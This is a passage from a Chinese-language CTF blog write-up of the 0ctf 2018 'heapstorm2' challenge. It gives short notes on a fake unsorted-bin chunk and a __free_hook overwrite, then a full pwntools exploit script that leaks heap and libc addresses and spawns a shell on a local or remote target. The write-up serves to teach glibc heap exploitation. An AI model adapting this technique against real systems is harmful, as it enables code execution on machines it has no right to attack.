</span></span><span class=line><span class=cl><span class=nf>assert</span> <span class=p>(</span><span class=o>!</span><span class=n>mem</span> <span class=o>||</span> <span class=nf>chunk_is_mmapped</span> <span class=p>(</span><span class=nf>mem2chunk</span> <span class=p>(</span><span class=n>mem</span><span class=p>))</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>        <span class=n>av</span> <span class=o>==</span> <span class=nf>arena_for_chunk</span> <span class=p>(</span><span class=nf>mem2chunk</span> <span class=p>(</span><span class=n>mem</span><span class=p>)));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=fake-unsorted-bin>fake unsorted bin<a hidden class=anchor aria-hidden=true href=#fake-unsorted-bin>#</a></h3><p>将unsorted bin中的某一chunk的fd、bk修改为0x133707f0，分配0x48就能将0x56的chunk分配出来。</p><p>unsorted bin从尾部往头部依次遍历，将其放入对应的bin或将其分配。从unsorted bin中取出时，有以下操作，所以得保证bk->fd是个可写的位置。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* remove from unsorted list */</span>
</span></span><span class=line><span class=cl><span class=nf>unsorted_chunks</span> <span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span> <span class=p>(</span><span class=n>av</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=后续操作>后续操作<a hidden class=anchor aria-hidden=true href=#后续操作>#</a></h3><p>改写数组，泄露heap_base地址，通过chunk中存储的bk、fd泄露libc_base，将<code>__free_hook</code>改成system地址。</p><h3 id=exploit>exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h3><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/0ctf2018%20heapstorm2/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./heapstorm2&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>allocate</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Command: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>update</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Command: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Content: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Command: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Command: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 0</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>     <span class=c1># 1</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x28</span><span class=p>)</span>      <span class=c1># 2</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0xf10</span><span class=p>)</span>     <span class=c1># 3</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0xef8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0xef0</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xf00</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x28</span><span class=o>-</span><span class=mi>12</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x28</span><span class=o>-</span><span class=mi>12</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 3</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 5</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>     <span class=c1># 6</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 7</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>     <span class=c1># 8</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 9</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span>     <span class=c1># 3</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span>     <span class=c1># 4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x58</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370800</span><span class=o>-</span><span class=mh>0x20</span><span class=o>+</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370800</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370800</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x48</span><span class=p>)</span>      <span class=c1># 5</span>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13377331</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370830</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x133707f3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>view</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Chunk[1]: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x30</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x4a0</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;heap: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x4a0</span><span class=o>+</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>view</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Chunk[1]: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3ABC80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x8</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;system: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *$rebase(0x1331)&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>update</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reference>reference<a hidden class=anchor aria-hidden=true href=#reference>#</a></h2><ol><li>how2heap large_bin_attack.c</li><li><a href=https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/>https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/</a></li><li><a href=https://eternalsakura13.com/2018/04/03/heapstorm2/>https://eternalsakura13.com/2018/04/03/heapstorm2/</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li><li><a href=https://hhdx.xyz/tags/how2heap/>How2heap</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>